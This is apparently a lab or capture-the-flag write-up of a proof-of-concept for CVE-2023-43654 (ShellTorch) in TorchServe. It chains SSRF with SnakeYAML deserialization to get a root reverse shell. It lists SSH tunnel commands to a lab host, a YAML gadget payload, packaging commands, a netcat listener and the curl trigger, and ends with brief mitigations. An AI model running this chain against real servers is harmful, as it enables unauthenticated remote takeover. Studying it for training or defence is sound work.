# Model Deployment Tampering (ShellTorch)

TorchServe SSRF (CVE-2023-43654) triggers YAML deserialization to execute arbitrary Java code.

## Attack Chain

1. SSH tunnel: ssh TARGET -R 8000:127.0.0.1:8000 -R 1337:127.0.0.1:1337 -L 8081:127.0.0.1:8081
2. Java payload in MyScriptEngineFactory constructor: bash reverse shell to 127.0.0.1:1337
3. spec.yaml: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:8000/"]]]]
4. Package with torch-workflow-archiver
5. Trigger: curl -X POST "http://127.0.0.1:8081/workflows?url=http://127.0.0.1:8000/student.war"

## Mac Notes

- brew install openjdk@17
- Use Python socket listener instead of ncat
- Use new workflow names for each attempt (server caches .war files)


# Model Deployment Tampering (ShellTorch)

This repository documents a proof-of-concept for exploiting **CVE-2023-43654** (ShellTorch) in **TorchServe**, combining Server-Side Request Forgery (SSRF) and unsafe object deserialization via SnakeYAML for unauthenticated RCE as `root`.

---

## 🚀 Attack Chain Overview

1. **Establish Persistent SSH Tunnels**: Forward remote APIs locally and open reverse connections for staging and shell capturing.
2. **Craft Payload Components**: Set up `handler.py`, `spec.yaml`, and `MyScriptEngineFactory.java`.
3. **Compile & Package**: Set up the SPI layout, compile for Java 17, and package artifacts.
4. **Trigger Deserialization**: Send an HTTP POST registration request to fire the execution cascade.

---

## 🛠️ Step-by-Step Implementation

### Step 1: Network Tunnels
```bash
ssh htb-stdnt@154.57.164.69 -p 38646 -R 8000:127.0.0.1:8000 -R 1337:127.0.0.1:1337 -L 8081:127.0.0.1:8081 -N
```

### Step 2: Payload Staging Scripts
* Create `handler.py` and `spec.yaml` to load models and reference the local URL loader.
* Create `MyScriptEngineFactory.java` using an explicit array object for `/bin/bash` execution to route payload strings correctly (refer to the referenced documents for full source code details).

### Step 3: Compilation and SPI Directory Assembly
```bash
mkdir -p META-INF/services/
echo 'exploit.MyScriptEngineFactory' > META-INF/services/javax.script.ScriptEngineFactory
javac -source 17 -target 17 MyScriptEngineFactory.java
mkdir -p exploit
mv MyScriptEngineFactory.class exploit/
```

### Step 4: Native macOS Package Generation
Invoke the Python module directly to avoid path issues:
```bash
python3 -m workflow_archiver.workflow_packaging --workflow-name student_final9 --spec-file spec.yaml --handler handler.py
```

### Step 5: Execute Exploitation Chain
1. **Host Staging Server**: `python3 -m http.server 8000`
2. **Start Listener**: `nc -lvn 1337`
3. **Trigger SSRF**: `curl -X POST "http://127.0.0.1:8081/workflows?url=http://127.0.0.1:8000/student_final9.war"` (wrap URLs in quotes for Zsh).

---

## 🍎 macOS Quick-Fix Checklist & Mitigations

* **Zsh Globbing**: Wrap URLs in double quotes to prevent errors from `?` characters.
* **Module Paths**: Use `python3 -m workflow_archiver.workflow_packaging` if the binary isn't found.
* **ClassCastException**: A `500 ClassCastException` after triggering is expected behavior as the exploit executes successfully.
* **Mitigations**: Enforce `SafeConstructor()`, isolate administrative ports, and implement outbound egress filtering.
